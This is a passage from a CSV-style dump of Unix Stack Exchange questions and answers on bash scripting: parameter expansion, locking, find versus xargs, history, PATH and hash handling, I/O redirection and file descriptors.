    echo ""User does not exist!!""
fi
</code></pre>
"
"How can I expand a quoted variable to nothing if it's empty?","415990","<bash><shell-script><zsh><variable>","36","<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_02"" rel=""noreferrer"">Posix compliant shells</a> and <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"" rel=""noreferrer"">Bash have</a> <code>${parameter:+word}</code>:</p>

<blockquote>
  <p>If <em>parameter</em> is unset or null, null shall be substituted; otherwise, the expansion of <em>word</em> (or an empty string if <em>word</em> is omitted) shall be substituted.</p>
</blockquote>

<p>So you can just do:</p>

<pre><code>${var1:+""$var1""}
</code></pre>

<p>and have <code>var1</code> be checked, and <code>""$var1""</code> be used if it's set and non-empty (with the ordinary double-quoting rules). Otherwise it expands to nothing. Note that only the <em>inner</em> part is quoted here, not the whole thing.</p>

<p>The same also works in zsh. You have to repeat the variable, so it's not ideal, but it works out exactly as you wanted.</p>

<p>If you want a set-but-empty variable to expand to an empty argument, use <code>${var1+""$var1""}</code> instead.</p>
"
"Displaying seconds as days/hours/mins/seconds?","27013","<bash>","36","<p>You can use something like this:</p>

<pre><code>function displaytime {
  local T=$1
  local D=$((T/60/60/24))
  local H=$((T/60/60%24))
  local M=$((T/60%60))
  local S=$((T%60))
  (( $D &gt; 0 )) &amp;&amp; printf '%d days ' $D
  (( $H &gt; 0 )) &amp;&amp; printf '%d hours ' $H
  (( $M &gt; 0 )) &amp;&amp; printf '%d minutes ' $M
  (( $D &gt; 0 || $H &gt; 0 || $M &gt; 0 )) &amp;&amp; printf 'and '
  printf '%d seconds\n' $S
}
</code></pre>

<p>Examples:</p>

<pre><code>$ displaytime 11617
3 hours 13 minutes and 37 seconds
$ displaytime 42
42 seconds
$ displaytime 666
11 minutes and 6 seconds
</code></pre>
"
"Start a process on a different tty","170063","<bash><tty>","36","<pre><code>setsid sh -c 'exec command &lt;&gt; /dev/tty2 &gt;&amp;0 2&gt;&amp;1'
</code></pre>

<p>As long as nothing else is using the other TTY (<code>/dev/tty2</code> in this example), this should work. This includes a <code>getty</code> process that may be waiting for someone to login; having more than one process reading its input from a TTY <em>will</em> lead to unexpected results.</p>

<p><code>setsid</code> takes care of starting the command in a new session.</p>

<p>Note that <code>command</code> will have to take care of setting the <code>stty</code> settings correctly, e.g. turn on ""cooked mode"" and <code>onlcr</code> so that outputting a newline will add a carriage return, etc.</p>
"
"How do I create a directory in all subdirectories?","61907","<bash><directory><wildcards>","36","<p>With <a href=""http://mywiki.wooledge.org/glob"">globs</a> :</p>

<pre><code>for dir in */; do mkdir -- ""$dir/tmp1""; done
</code></pre>

<h2>NOTE</h2>

<ul>
<li>I treat only dirs (including symlinks to dirs) with the little hack of using <code>*/</code> as a glob</li>
<li><p>If you want to create multiple subdirs at once :    </p>

<p><code>for dir in */; do mkdir -- ""$dir""/{tmp1,foo,bar,qux}; done</code></p></li>
</ul>
"
"The best way to expand glob pattern?","34011","<bash><wildcards>","36","<p>Just let it expand inside an array declaration's right side:</p>

<pre class=""lang-bash prettyprint-override""><code>list=(../smth*/)          # grab the list
echo ""${#list[@]}""        # print array length
echo ""${list[@]}""         # print array elements
for file in ""${list[@]}""; do echo ""$file""; done  # loop over the array
</code></pre>

<p><br>
Note that the shell option <code>nullglob</code> needs to be set.<br>
<strong>It is not set by default.</strong><br>
It prevents an error in case the glob (or one of multiple globs) does not match any name.  </p>

<p>Set it in <code>bash</code> with </p>

<pre><code>shopt -s nullglob
</code></pre>

<p>or in <code>zsh</code> with </p>

<pre><code>setopt nullglob
</code></pre>
"
"How to make sure only one instance of a bash script runs?","48505","<linux><bash><lock>","36","<p>Almost like nsg's answer: use a lock <em>directory</em>. Directory creation is atomic under linux and unix and *BSD and a lot of other OSes.</p>

<pre><code>if mkdir $LOCKDIR
then
    # Do important, exclusive stuff
    if rmdir $LOCKDIR
    then
        echo ""Victory is mine""
    else
        echo ""Could not remove lock dir"" &gt;&amp;2
    fi
else
    # Handle error condition
    ...
fi
</code></pre>

<p>You can put the PID of the locking sh into a file in the lock directory for debugging purposes, but don't fall into the trap of thinking you can check that PID to see if the locking process still executes. Lots of race conditions lie down that path.</p>
"
"How can one run multiple programs in the background with single command?","67006","<bash><shell-script>","35","<p>From a shell syntax point of view, <code>&amp;</code> separates commands like <code>;</code>/<code>|</code>/<code>&amp;&amp;</code>... (though of course with different semantic). So it's just:</p>

<pre><code>cmd1 &amp; cmd2 &amp; cmd3 &amp;
</code></pre>
"
"Using grep in conditional statement in bash","275329","<bash><shell-script><ubuntu>","35","<p>You're almost there. Just omit the exclamation mark:</p>

<pre><code>OUTPUT='blah blah (Status: 200)'
if echo ""$OUTPUT"" | grep -q ""(Status:\s200)""; then
    echo ""MATCH""
fi
</code></pre>

<p>Result:</p>

<pre><code>MATCH
</code></pre>

<p>The <code>if</code> condition is fulfilled if grep returns with exit code 0 (which means a match). The <code>!</code> exclamation mark will negate this.</p>
"
"How to get milliseconds since Unix epoch?","69322","<bash><timestamps>","35","<p><code>date +%s.%N</code> will give you, eg., <code>1364391019.877418748</code>.  The %N is the
number of nanoseconds elapsed in the current second. Notice it is 9 digits,
and by default date will pad this with zeros if it is less than 100000000.  This is actually a problem if we want to do math with the number, because <a href=""http://tldp.org/LDP/abs/html/numerical-constants.html"" rel=""nofollow noreferrer"">bash treats numbers with a leading zero as octal</a>.  This padding can be disabled by using a hyphen in the field spec, so:</p>

<pre><code>echo $((`date +%s`*1000+`date +%-N`/1000000))
</code></pre>

<p>would naively give you milliseconds since the epoch.</p>

<p><strong>However</strong>, as Stephane Chazelas points out in comment below, that's two different <code>date</code> calls which will yield two slightly different times.  If
the second has rolled over in between them, the calculation will be an
entire second off.  So:</p>

<pre><code>echo $(($(date +'%s * 1000 + %-N / 1000000')))
</code></pre>

<p>Or optimized (thanks to comments below, though this should have been obvious):</p>

<pre><code>echo $(( $(date '+%s%N') / 1000000));
</code></pre>
"
"How do I close a terminal without saving the history?","25049","<bash><command-history>","35","<p>Your shell's history is saved in the file indicated by the <code>HISTFILE</code> variable. So:</p>

<pre><code>unset HISTFILE
</code></pre>

<p>This also applies to zsh, but not to ksh which keeps saving to the file indicated by <code>$HISTFILE</code> when the shell starts (and conversely, you decide to save your history in ksh once you've started the shell).</p>
"
"How to get the output inside `screen` out to a script?","12601","<bash><logs><gnu-screen><recording>","35","<p>You could start <code>screen</code> with the <code>-L</code> option.  This will cause screen to create a file <code>screenlog.n</code> (the n part is numerical, starting with a zero) in the current working directory.</p>

<p>In your case this would look something like: <code>screen -S session_name -L -X eval 'stuff ""$cmd""\015'</code></p>

<p>As long as you remember to clean up afterwards, this should match what you are after.</p>

<p>For last line of the log, it can easily be obtained with <code>tail -1 screenlog.0</code>, or the entire log can be parsed however you wish.</p>
"
"find -exec + vs find | xargs: which one to choose?","41740","<bash><find><pipe><xargs>","35","<p>You might want to chain calls to find (once, when you learned, that it is possible, which might be today). This is, of course, only possible as long as you stay in find. Once you pipe to xargs it's out of scope. </p>

<p>Small example, two files a.lst and b.lst: </p>

<pre><code>cat a.lst
fuddel.sh
fiddel.sh

cat b.lst
fuddel.sh
</code></pre>

<p>No trick here - simply the fact that both contain ""fuddel"" but only one contains ""fiddel"".</p>

<p>Assume we didn't know that. We search a file which matches 2 conditions: </p>

<pre><code>find -exec grep -q fuddel {} "";"" -exec grep -q fiddel {} "";"" -ls
192097    4 -rw-r--r--   1 stefan   stefan         20 Jun 27 17:05 ./a.lst
</code></pre>

<p>Well, maybe you know the syntax for grep or another program to pass both strings as condition, but that's not the point. Every program which can return true or false, given a file as argument, can be used here - grep was just a popular example. </p>

<p>And note, you may follow <strong>find -exec</strong> with other find commands, like <strong>-ls</strong> or <strong>-delete</strong> or something similar. Note, that delete not only does rm (removes files), but rmdir (removes directories) too. </p>

<p>Such a chain is read as an AND combination of commands, as long as not otherwise specified (namely with an <code>-or</code> switch (and parens (which need masking))). </p>

<p>So you aren't leaving the find chain, which is a handy thing. I don't see any advantage in using -xargs, since you have to be careful in passing the files, which is something find doesn't need to do - it automatically handles passing each file as a single argument for you. </p>

<p>If you believe you need some masking for finds <a href=""https://unix.stackexchange.com/questions/8647/gnu-find-and-masking-the-for-some-shells-which"">{} braces</a>, feel free to visit my question which asks for evidence. My assertion is: You don't. </p>
"
"How does !! work in bash?","305744","<bash><shell-script><command-history>","34","<p><code>!!</code> is listed in the <code>bash</code> manual under the heading ""Event Designators"":</p>

<pre class=""lang-none prettyprint-override""><code>   An event designator is a reference to a command line  entry  in  the
   history list.  Unless the reference is absolute, events are relative
   to the current position in the history list.

   !      Start a history  substitution,  except  when  followed  by  a
          blank,  newline,  carriage  return,  = or ( (when the extglob
          shell option is enabled using the shopt builtin).
   !n     Refer to command line n.
   !-n    Refer to the current command minus n.
   !!     Refer to the previous command.  This is a synonym for  `!-1'.
   !string
          Refer  to the most recent command preceding the current posi-
          tion in the history list starting with string.
   !?string[?]
          Refer to the most recent command preceding the current  posi-
          tion  in  the history list containing string.  The trailing ?
          may be omitted if string is followed immediately  by  a  new-
          line.
   ^string1^string2^
          Quick  substitution.   Repeat the previous command, replacing
          string1       with       string2.        Equivalent        to
          ``!!:s/string1/string2/'' (see Modifiers below).
   !#     The entire command line typed so far.
</code></pre>

<p>So <code>!!</code> will be replaced with the previous command.</p>

<p>Note that the shell history will not contain the literal <code>!!</code> but instead the actual command that was executed:</p>

<pre><code>$ ls
[some output]

$ !! .
[same output]

$ history 3
  645  2016-08-25 17:40:55 ls
  646  2016-08-25 17:40:57 ls .
  647  2016-08-25 17:41:00 history 3
</code></pre>
"
"Add path to $PATH if not already in $PATH","217622","<bash><shell-script><scripting><path>","34","<p>First check if the path to add is already part of the variable:</p>

<pre><code>[[ "":$PATH:"" != *"":/path/to/add:""* ]] &amp;&amp; PATH=""/path/to/add:${PATH}""
</code></pre>

<p>If <code>/path/to/add</code> is already in the <code>$PATH</code>, then nothing happens, else it is added at the beginning.</p>

<p>If you need it at the end use <code>PATH=${PATH}:/path/to/add</code> instead.</p>

<p><strong>Edit</strong>: In you case it would look like this:</p>

<pre><code>[[ "":$PATH:"" != *"":${OPENSHIFT_HOMEDIR}/app-root/runtime/bin:""* ]] &amp;&amp; PATH=""${OPENSHIFT_HOMEDIR}/app-root/runtime/bin:${PATH}""
</code></pre>
"
"Remove specific word in variable","311758","<bash><shell-script><variable>","34","<p>Try:</p>

<pre><code>$ printf '%s\n' ""${FOO//$WORDTOREMOVE/}""
CATS DOGS FISH
</code></pre>

<p>This also work in <code>ksh93</code>, <code>mksh</code>, <code>zsh</code>.</p>

<hr>

<p>POSIXLY:</p>

<pre><code>FOO=""CATS DOGS FISH MICE""
WORDTOREMOVE=""MICE""

remove_word() (
  set -f
  IFS=' '

  s=$1
  w=$2

  set -- $1
  for arg do
    shift
    [ ""$arg"" = ""$w"" ] &amp;&amp; continue
    set -- ""$@"" ""$arg""
  done

  printf '%s\n' ""$*""
)

remove_word ""$FOO"" ""$WORDTOREMOVE""
</code></pre>

<p>It assumes your words are space delimited and has side effect that remove spaces before and after <code>""$WORDTOREMOVE""</code>.</p>
"
"Quick way to include a directory path when calling mv?","35782","<bash><rename>","34","<p>Use <a href=""http://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html#Brace-Expansion"">brace expansion</a>:</p>

<pre><code>mv very/long/path/to/filename.{old,new}
</code></pre>

<p>would expand to</p>

<pre><code>mv very/long/path/to/filename.old very/long/path/to/filename.new
</code></pre>
"
"Why does remote Bash source .bash_profile instead of .bashrc","332531","<bash><ssh>","34","<p>A login shell first reads <code>/etc/profile</code> and then <code>~/.bash_profile</code>.</p>
<p>A non-login shell reads from <code>/etc/bash.bashrc</code> and then <code>~/.bashrc</code>.</p>
<p>Why is that important?</p>
<p>Because of this line in <code>man ssh</code>:</p>
<blockquote>
<p>If <em>command</em> is specified, it is executed on the remote host instead of a login shell.</p>
</blockquote>
<p>In other words, if the ssh command only has options (not a command), like:</p>
<pre><code>ssh user@host
</code></pre>
<p>It will start a login shell, a login shell reads <code>~/.bash_profile</code>.</p>
<p>An ssh command which does have a <em>command</em>, like:</p>
<pre><code>ssh user@host :
</code></pre>
<p>Where the command is <code>:</code> (or do nothing).<br />
It will <strong>not</strong> start a login shell, therefore <code>~/.bashrc</code> is what will be read.</p>
<hr />
<h3>Remote stdin</h3>
<p>The supplied tty connection for /dev/stdin in the remote computer may be an actual tty or something else.</p>
<p>For:</p>
<pre><code>$ ssh isaac@localhost
/etc/profile sourced

$ ls -la /dev/stdin
lrwxrwxrwx 1 root root 15 Dec 24 03:35 /dev/stdin -&gt; /proc/self/fd/0

$ ls -la /proc/self/fd/0
lrwx------ 1 isaac isaac 64 Dec 24 19:34 /proc/self/fd/0 -&gt; /dev/pts/3

$ ls -la /dev/pts/3
crw--w---- 1 isaac tty 136, 3 Dec 24 19:35 /dev/pts/3
</code></pre>
<p>Which ends in a TTY (not a network connection) as the started bash sees it.</p>
<p>For a ssh connection with a command:</p>
<pre><code>$ ssh isaac@localhost 'ls -la /dev/stdin'
isaac@localhost's password: 
lrwxrwxrwx 1 root root 15 Dec 24 03:35 /dev/stdin -&gt; /proc/self/fd/0
</code></pre>
<p>The list of TTY's start the same, but note that /etc/profile was not sourced.</p>
<pre><code>$ ssh isaac@localhost 'ls -la /proc/self/fd/0'
isaac@localhost's password:
lr-x------ 1 isaac isaac 64 Dec 24 19:39 /proc/self/fd/0 -&gt; pipe:[6579259]
</code></pre>
<p>Which tells the shell that the connection is a pipe (not a network connection).</p>
<p>So, in both the test cases, the shell is unable to know that the connection is from a network and therefore does not read <code>~/.bashrc</code> (if we only talk about the connection to a network). It does read ~/.bashrc, but for a different reason.</p>
"
"Difference between ""command not found"" and ""no such file or directory""?","289499","<bash><command-line><executable>","34","<p>That's because <code>bash</code> remembered your command location, store it in a <a href=""https://www.gnu.org/software/bash/manual/bashref.html#index-hash"">hash</a> table.</p>

<p>After you uninstalled <code>node</code>, the hash table isn't cleared, <code>bash</code> still thinks <code>node</code> is at <code>/usr/local/bin/node</code>, skipping the <code>PATH</code> lookup, and calling <code>/usr/local/bin/node</code> directly, using <code>execve()</code>. Since when <code>node</code> isn't there anymore, <code>execve()</code> returns <code>ENOENT</code> error, means no such file or directory, <code>bash</code> reported that error to you.</p>

<p>In <code>bash</code>, you can remove an entry from hash table:</p>

<pre><code>hash -d node
</code></pre>

<p>or remove the entire hash table (<a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/hash.html#tag_20_56"">works in all POSIX shell</a>):</p>

<pre><code>hash -r
</code></pre>
"
"What does a ""< <(...)"" redirection mean?","22645","<bash><shell><io-redirection>","34","<p>No, <code>&lt; &lt;</code> and <code>&lt;&lt;</code> are not the same thing.</p>

<p>The first is composed of the common <code>&lt;</code> redirection character combined with the first character of the <code>&lt;(command)</code> syntax. This is a <code>ksh</code> construct (also found in <code>bash</code> and <code>zsh</code>) known as <em>process substitution</em> that takes the output of <code>command</code> and provides it in a file whose name refers to the other end of the pipe <code>command</code> is writing to.</p>

<p>In other word you can think of <code>&lt; &lt;(command)</code> as <code>&lt; file</code>, where file contains the output of <code>command</code>.</p>
"
"Avoid running the script if a variable is not defined","228331","<bash><shell><shell-script>","34","<p>The quickest way is probably to add these two lines to the start of the script:</p>

<pre><code>set -u # or set -o nounset
: ""$BATCHNUM""
</code></pre>

<p>The first line sets the <code>nounset</code> option in the shell running the script, which aborts if you try to expand an unset variable; the second expands <code>$BATCHNUM</code> in the context of a no-op, to trigger the abort before doing anything else.</p>

<p>If you want a more helpful error message, you could instead write:</p>

<pre><code>if [[ -z ""$BATCHNUM"" ]]; then
    echo ""Must provide BATCHNUM in environment"" 1&gt;&amp;2
    exit 1
fi
</code></pre>

<p>Or similar.</p>
"
"adding text to filename before extension","56810","<bash><rename><filenames>","34","<p>Using <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_02"">standard POSIX parameter expansion</a>:</p>

<pre><code>for f in *.shp; do printf '%s\n' ""${f%.shp}_poly.shp""; done
</code></pre>
"
"Can bash case statements cascade?","75354","<bash><shell-script>","34","<p>You need to use <code>;&amp;</code> instead of <code>;;</code> to get a fall-through behavior:</p>

<pre><code>#! /bin/bash
foo() {
    case ""$1"" in
        3)
            echo ""Level Three""
            ;&amp;
        2)
            echo ""Level Two""
            ;&amp;
        1)
            echo ""Level One""
            ;;
        a)
            echo ""Level a""
            ;&amp;
        b)
            echo ""Level b""
            ;&amp;
        c)
            echo ""Level c""
            ;;
    esac
}
echo 3:
foo 3
echo 2:
foo 2
echo a:
foo a
</code></pre>



<pre><code>3:
Level Three
Level Two
Level one
2:
Level Two
Level one
a:
Level a
Level b
Level c
</code></pre>

<p>See the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Conditional-Constructs"">Conditional Constructs</a> section of the bash documentation.</p>

<p>The other special marker is <code>;;&amp;</code>, which:</p>

<blockquote>
  <p>causes the shell to test the patterns in the next clause, if any, and execute any associated command-list on a successful match.</p>
</blockquote>

<p><code>;;</code> is always final, no further patterns are tested.</p>

<pre><code>#! /bin/bash

foo() {
    case ""$1"" in
        *3*)
            echo ""Level Three""
            ;;&amp;
        *2*)
            echo ""Level Two""
            ;;&amp;
        *1*)
            echo ""Level One""
            ;;&amp;
    esac
}

echo 12:
foo 12
echo 13:
foo 13
echo 23:
foo 23
</code></pre>



<pre><code>12:
Level Two
Level One
13:
Level Three
Level One
23:
Level Three
Level Two
</code></pre>
"
"Using exec and tee to redirect logs to stdout and a log file in the same time","145651","<bash><logs><tee><exec>","34","<p>Use <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Process-Substitution"" rel=""noreferrer"">process substitution</a> with <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Redirecting-Standard-Output-and-Standard-Error"" rel=""noreferrer""><code>&amp;</code> redirection</a> and <a href=""https://www.gnu.org/software/bash/manual/bashref.html#index-exec"" rel=""noreferrer""><code>exec</code></a>:</p>

<pre><code>exec &amp;&gt; &gt;(tee -a ""$log_file"")
echo ""This will be logged to the file and to the screen""
</code></pre>

<p><code>$log_file</code> will contain the output of the script and any subprocesses, and the output will also be printed to the screen.</p>

<ul>
<li><p><code>&gt;(...)</code> starts the process <code>...</code> and returns a file representing its standard input. </p></li>
<li><p><code>exec &amp;&gt; ...</code> redirects both standard output and standard error into <code>...</code> for the remainder of the script (use just <code>exec &gt; ...</code> for stdout only). </p></li>
<li><p><code>tee -a</code> appends its standard input to the file, and also prints it to the screen.</p></li>
</ul>
"
"How does TAB auto-complete find options to complete?","12356","<bash><autocomplete>","34","<p>Depending on the command:</p>

<ul>
<li>Someone may have written a function to generate possible completions of arguments, including options. You'll find functions for some commands in <code>/etc/bash_completion.d/*</code> (or a different location on some systems). These functions are registered with the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-complete-385""><code>complete</code></a> <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Programmable-Completion-Builtins"">built-in</a> (e.g. <code>complete -F _find find</code> tells bash to call the <code>_find</code> function when you press <kbd>Tab</kbd> on a <code>find</code> command). They use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-compgen-384""><code>compgen</code></a> built-in to tell bash “here are the possible completions”.</li>
<li>For some commands, bash will call the command with the argument <code>--help</code> and parse the output. Such commands can be registered with the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-complete-385""><code>complete</code></a> built-in, e.g. <code>complete -F _longopt ls</code>. <code>_longopt</code> is in fact a completion generation function, that happens to parse a command's output rather than use a fixed list. (There are other more specialized completion functions that parse a command's output to generate possible completions; look in <code>/etc/bash_completion.d/*</code> for examples.)</li>
<li>For things like aliases, the completion function looks them up in bash's internal tables. The <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-complete-385""><code>complete</code></a> built-in has options for that, e.g. <code>-A</code> for aliases.</li>
</ul>
"
"What happens if you edit a script during execution?","88487","<linux><bash><shell><process-management>","34","<p>In Unix, most editors work by creating a new temporary file containing the edited contents. When the edited file is saved, the original file is deleted and the temporary file renamed to the original name. (There are, of course, various safeguards to prevent dataloss.) This is, for example, the style used by <code>sed</code> or <code>perl</code> when invoked with the <code>-i</code> (""in-place"") flag, which is not really ""in-place"" at all. It should have been called ""new place with old name"".</p>

<p>This works well because unix assures (at least for local filesystems) that an opened file continues to exist until it is closed, even if it is ""deleted"" and a new file with the same name is created. (It's not coincidental that the unix system call to ""delete"" a file is actually called ""unlink"".) So, generally speaking, if a shell interpreter has some source file open, and you ""edit"" the file in the manner described above, the shell won't even see the changes since it still has the original file open.</p>

<p>[Note: as with all standards-based comments, the above is subject to multiple interpretations and there are various corner-cases, such as NFS. Pedants are welcome to fill the comments with exceptions.]</p>

<p>It is, of course, possible to modify files directly; it's just not very convenient for editing purposes, because while you can overwrite data in a file, you cannot delete or insert without shifting all following data, which would imply quite a lot of rewriting. Furthermore, while you were doing that shifting, the contents of the file would be unpredictable and processes which had the file open would suffer. In order to get away with this (as with database systems, for example), you need a sophisticated set of modification protocols and distributed locks; stuff which is well beyond the scope of a typical file editing utility.</p>

<p>So, if you want to edit a file while its being processed by a shell, you have two options:</p>

<ol>
<li><p>You can append to the file. This should always work.</p></li>
<li><p>You can overwrite the file with new contents <em>of exactly the same length</em>. This may or may not work, depending on whether the shell has already read that part of the file or not. Since most file I/O involves read buffers, and since all the shells I know read an entire compound command before executing it, it is pretty unlikely that you can get away with this. It certainly wouldn't be reliable.</p></li>
</ol>

<p>I don't know of any wording in the Posix standard which actually requires the possibility of appending to a script file while the file is being executed, so it might not work with every Posix compliant shell, much less with the current offering of almost- and sometimes-posix-compliant shells. So YMMV. But as far as I know, it does work reliably with bash.</p>

<p>As evidence, here's a ""loop-free"" implementation of the infamous 99 bottles of beer program in bash, which uses <code>dd</code> to overwrite and append (the overwriting is presumably safe because it substitutes the currently executing line, which is always the last line of the file, with a comment of exactly the same length; I did that so that the end result can be executed without the self-modifying behaviour.) </p>

<pre><code>#!/bin/bash
if [[ $1 == reset ]]; then
  printf ""%s\n%-16s#\n"" '####' 'next ${1:-99}' |
  dd if=/dev/stdin of=$0 seek=$(grep -bom1 ^#### $0 | cut -f1 -d:) bs=1 2&gt;/dev/null
  exit
fi

step() {
  s=s
  one=one
  case $beer in
    2) beer=1; unset s;;
    1) beer=""No more""; one=it;;
    ""No more"") beer=99; return 1;;
    *) ((--beer));;
  esac
}
next() {
  step ${beer:=$(($1+1))}
  refrain |
  dd if=/dev/stdin of=$0 seek=$(grep -bom1 ^next\  $0 | cut -f1 -d:) bs=1 conv=notrunc 2&gt;/dev/null
}
refrain() {
  printf ""%-17s\n"" ""# $beer bottles""
  echo echo ${beer:-No more} bottle$s of beer on the wall, ${beer:-No more} bottle$s of beer.
  if step; then
    echo echo Take $one down, pass it around, $beer bottle$s of beer on the wall.
    echo echo
    echo next abcdefghijkl
  else
    echo echo Go to the store, buy some more, $beer bottle$s of beer on the wall.
  fi
}
####
next ${1:-99}   #
</code></pre>
"
"Bash remembers wrong path to an executable that was moved/deleted","335801","<bash><path><which>","34","<p>When you run a command in <code>bash</code> it will remember the location of that executable so it doesn't have to search the <code>PATH</code> again each time.  So if you run the executable, then change the location, <code>bash</code> will still try to use the old location.  You should be able to confirm this with <code>hash -t pip3</code> which will show the old location.</p>

<p>If you run <code>hash -d pip3</code> it will tell bash to forget the old location and should find the new one next time you try.</p>
"
"How to make the terminal display user@machine in bold letters?","31695","<bash><prompt><escape-characters>","34","<p>You should be able to do this by setting the <code>PS1</code> prompt variable in your <code>~/.bashrc</code> file like this:</p>

<pre><code>PS1='[\u@\h \w]\$ '
</code></pre>

<p>To make it colored (and possibly bold - this depends on whether your terminal emulator has enabled it) you need to add escape color codes:</p>

<pre><code>PS1='\[\e[1;91m\][\u@\h \w]\$\[\e[0m\] '
</code></pre>

<p>Here, everything not being escaped between the <code>1;91m</code> and <code>0m</code> parts will be colored in the <code>1;91</code> color (bold red). Put these escape codes around different parts of the prompt to use different colors, but remember to reset the colors with <code>0m</code> or else you will have colored terminal output as well. Remember to source the file afterwards to update the current shell: <code>source ~/.bashrc</code></p>
"
"File descriptors & shell scripting","13724","<bash><shell-script><io-redirection><file-descriptors>","34","<p>First, note that the syntax for closing is <code>5&gt;&amp;-</code> or <code>6&lt;&amp;-</code>, depending on whether the file descriptor is being read for writing or for reading. There seems to be a typo or formatting glitch in that blog post.</p>

<p>Here's the commented script.</p>

<pre><code>exec 5&gt;/tmp/foo       # open /tmp/foo for writing, on fd 5
exec 6&lt;/tmp/bar       # open /tmp/bar for reading, on fd 6
cat &lt;&amp;6 |             # call cat, with its standard input connected to
                      # what is currently fd 6, i.e., /tmp/bar
while read a; do      # 
  echo $a &gt;&amp;5         # write to fd 5, i.e., /tmp/foo
done                  # 
</code></pre>

<p>There's no closing here. Because all the inputs and outputs are going to the same place in this simple example, the use of extra file descriptors is not necessary. You could write</p>

<pre><code>cat &lt;/tmp/bar |
while read a; do
  echo $a
done &gt;/tmp/foo
</code></pre>

<p>Using explicit file descriptors becomes useful when you want to write to multiple files in turn. For example, consider a script that outputs data to a data output file and logging data to a log file and possibly error messages as well. That means three output channels: one for data, one for logs and one for errors. Since there are only two standard descriptors for output, a third is needed. You can call <code>exec</code> to open the output files:</p>

<pre><code>exec &gt;data-file
exec 3&gt;log-file
echo ""first line of data""
echo ""this is a log line"" &gt;&amp;3
…
if something_bad_happens; then echo error message &gt;&amp;2; fi
exec &gt;&amp;-  # close the data output file
echo ""output file closed"" &gt;&amp;3
</code></pre>

<p>The remark about efficiency comes in when you have a redirection in a loop, like this (assume the file is empty to begin with):</p>

<pre><code>while …; do echo $a &gt;&gt;/tmp/bar; done
</code></pre>

<p>At each iteration, the program opens <code>/tmp/bar</code>, seeks to the end of the file, appends some data and closes the file. It is more efficient to open the file once and for all:</p>

<pre><code>while …; do echo $a; done &gt;/tmp/bar
</code></pre>

<p>When there are multiple redirections happening at different times, calling <code>exec</code> to perform redirections rather than wrapping a block in a redirection becomes useful.</p>

<pre><code>exec &gt;/tmp/bar
while …; do echo $a; done
</code></pre>

<p>You'll find several other <a href=""https://unix.stackexchange.com/questions/tagged/io-redirection+shell"">examples of redirection by browsing the <code>io-redirection</code> tag on this site</a>.</p>
"
"How to get the tty in which bash is running?","270272","<bash><tty><ps>","33","<p>Simply by typing <code>tty</code>:</p>

<pre><code>$ tty 
/dev/pts/20
</code></pre>

<p>Too simple and obvious to be true :)</p>

<p><strong>Edit:</strong> The first one returns you also the <code>pty</code> of the process running <code>grep</code> as you can notice:</p>

<pre><code>$ ps ax | grep $$
28295 pts/20   Ss     0:00 /bin/bash
29786 pts/20   S+     0:00 grep --color=auto 28295
</code></pre>

<p>therefore you would need to filter out the grep to get only one result, which is getting ugly:</p>

<pre><code>ps ax | grep $$ | grep -v grep | awk '{ print $2 }'
</code></pre>

<p>or using </p>

<pre><code>ps ax | grep ""^$$"" | awk '{ print $2 }'
</code></pre>

<p>(a more sane variant)</p>
"
"How to insert variables inside a string containing """"?","332691","<bash><shell><variable><xml>","33","<p>You can embed variables only in double-quoted strings.</p>

<p>An easy and safe way to make this work is to break out of the single-quoted string like this:</p>

<pre><code>xml='&lt;?xml version=""1.0"" encoding=""iso-8859-1""?&gt;&lt;tag1&gt;'""$str1""'&lt;/tag1&gt;&lt;tag2&gt;'""$str2""'&lt;/tag2&gt;'
</code></pre>

<p>Notice that after breaking out of the single-quoted string, I enclosed the variables within double-quotes.
This is to make it safe to have special characters inside the variables.</p>

<p>Since you asked for another way, here's an inferior alternative using <code>printf</code>:</p>

<pre><code>xml=$(printf '&lt;?xml version=""1.0"" encoding=""iso-8859-1""?&gt;&lt;tag1&gt;%s&lt;/tag1&gt;&lt;tag2&gt;%s&lt;/tag2&gt;' ""$str1"" ""$str2"")
</code></pre>

<p>This is inferior because it uses a sub-shell to achieve the same effect, which is an unnecessary extra process.</p>

<p>As <a href=""https://unix.stackexchange.com/users/65304/steeldriver"">@steeldriver</a> wrote in a comment, in modern versions of bash, you can write like this to avoid the sub-shell:</p>

<pre><code>printf -v xml ' ... ' ""$str1"" ""$str2""
</code></pre>

<p>Since <code>printf</code> is a shell builtin, this alternative is probably on part with my first suggestion at the top.</p>
"
"Why can Shell builtins not be run with capital letters but other commands can?","164676","<bash><shell><osx><hfs+><case-sensitivity>","33","<p>From your other questions I take it you're using OS X. The default HFS+ filesystem on OS X is case-insensitive: you can't have two files called ""abc"" and ""ABC"" in the same directory, and trying to access either name will get to the same file. The same thing can happen under Cygwin, or with case-insensitive filesystems (like FAT32 or <a href=""http://www.brain-dump.org/projects/ciopfs/"" rel=""nofollow noreferrer"">ciopfs</a>) anywhere.</p>

<p>Because <code>grep</code> is a real executable, it's looked up on the filesystem (in the directories of <code>PATH</code>). When your shell looks in <code>/usr/bin</code> for either <code>grep</code> or <code>GREP</code> it will find the <code>grep</code> executable.</p>

<p>Shell builtins are <em>not</em> looked up on the filesystem: because they're built in, they are accessed through (case-sensitive) string comparisons inside the shell itself.</p>

<p>What you're encountering is an interesting case. While <code>cd</code> is a builtin, accessed case-sensitively, <code>CD</code> is found as an executable <code>/usr/bin/cd</code>. The <code>cd</code> executable is pretty useless: because <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/cd.html#tag_20_14_16"" rel=""nofollow noreferrer""><code>cd</code> affects the current shell execution environment, it is always provided as a shell regular built-in</a>, but there is a <code>cd</code> executable <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap01.html#tag_17_06"" rel=""nofollow noreferrer"">for POSIX's sake</a> anyway, which changes directory for itself and then immediately terminates, leaving the surrounding shell where it started.</p>

